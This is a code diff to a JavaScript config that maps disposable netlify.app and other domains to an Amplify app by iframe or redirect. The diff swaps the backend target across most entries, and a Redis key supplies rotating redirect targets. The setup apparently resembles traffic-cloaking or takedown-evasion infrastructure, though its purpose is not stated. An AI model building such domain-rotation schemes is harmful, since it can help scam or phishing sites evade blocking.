@@ -109,14 +109,14 @@ async function getRotationTarget(key) {
 //                    embed it in an iframe (target is ignored)
 const ORIGIN_GROUPS = {
   rocky: {
-    "https://aquamarine-cascaron-959598.netlify.app": { method: "iframe", target: "https://main.d2l0pw3wlvdxiy.amplifyapp.com" },
-    "https://silly-griffin-68e13a.netlify.app": { method: "iframe", target: "https://main.d2l0pw3wlvdxiy.amplifyapp.com" },
-    "https://resplendent-donut-186798.netlify.app": { method: "iframe", target: "https://main.d2l0pw3wlvdxiy.amplifyapp.com" },
-    "https://chipper-belekoy-fa4f48.netlify.app": { method: "iframe", target: "https://main.d2l0pw3wlvdxiy.amplifyapp.com" },
+    "https://aquamarine-cascaron-959598.netlify.app": { method: "iframe", target: "https://main.d2yknk44y70k63.amplifyapp.com" },
+    "https://silly-griffin-68e13a.netlify.app": { method: "iframe", target: "https://main.d2yknk44y70k63.amplifyapp.com" },
+    "https://resplendent-donut-186798.netlify.app": { method: "iframe", target: "https://main.d2yknk44y70k63.amplifyapp.com" },
+    "https://chipper-belekoy-fa4f48.netlify.app": { method: "iframe", target: "https://main.d2yknk44y70k63.amplifyapp.com" },
     "https://hiroakitravels.com": { method: "redirect", target: AMPLIFY_URL_FALLBACK, redisKey: KEY_AMPLIFY_URL },
     "https://teruogames.org": { method: "redirect", target: AMPLIFY_URL_FALLBACK, redisKey: KEY_AMPLIFY_URL },
-    "https://ornate-baklava-9b22fb.netlify.app": { method: "iframe", target: "https://main.d2l0pw3wlvdxiy.amplifyapp.com" }, // teruogames link
-    "https://cool-kelpie-239781.netlify.app": { method: "iframe", target: "https://main.d2l0pw3wlvdxiy.amplifyapp.com" }, // teruogames link
+    "https://ornate-baklava-9b22fb.netlify.app": { method: "iframe", target: "https://main.d2yknk44y70k63.amplifyapp.com" }, // teruogames link
+    "https://cool-kelpie-239781.netlify.app": { method: "iframe", target: "https://main.d2yknk44y70k63.amplifyapp.com" }, // teruogames link
   },
   dmc: {
     // "https://middlepage.onrender.com/?gclid=twygyuewewewgvehwwhdwdwhdjwdhgwdsuidwdwd": { method: "iframe", target: "https://dmc1-environment.onrender.com" },
